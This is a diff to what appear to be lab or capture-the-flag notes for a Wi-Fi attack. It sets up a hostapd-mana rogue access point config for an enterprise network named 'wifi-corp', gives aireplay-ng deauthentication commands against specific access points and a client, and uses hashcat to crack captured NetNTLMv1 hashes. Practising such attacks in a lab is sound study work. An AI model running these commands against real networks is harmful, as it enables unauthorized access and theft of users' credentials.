@@ -315,10 +315,10 @@ network={
 
 - nano network.conf
 ``` conf copy
-ssid=<ESSID>
+ssid=wifi-corp
 interface=wlan1
 driver=nl80211
-channel=<channel>
+channel=44
 hw_mode=a
 ieee8021x=1
 eap_server=1
@@ -343,7 +343,7 @@ mana_eaptls=1
 1. hostapd-mana network.conf
 2. > at the same time in two terminals:
 -  1. iwconfig wlan0mon channel 44
--  2. aireplay-ng -0 0 -a F0:9F:C2:71:22:1A wlan0mon -c 64:32:A8:07:6C:40
+-  2. aireplay-ng -0 1 -a F0:9F:C2:71:22:1A wlan0mon -c 64:32:A8:BA:6C:41
 -  1. iwconfig wlan0mon channel 44
--  2. aireplay-ng -0 0 -a F0:9F:C2:71:22:15 wlan0mon -c 64:32:A8:07:6C:40
+-  2. aireplay-ng -0 1 -a F0:9F:C2:71:22:15 wlan0mon -c 64:32:A8:BA:6C:41
 3. hashcat -a 0 -m 5500 hashcat.5500 ~/rockyou-top100000.txt --force
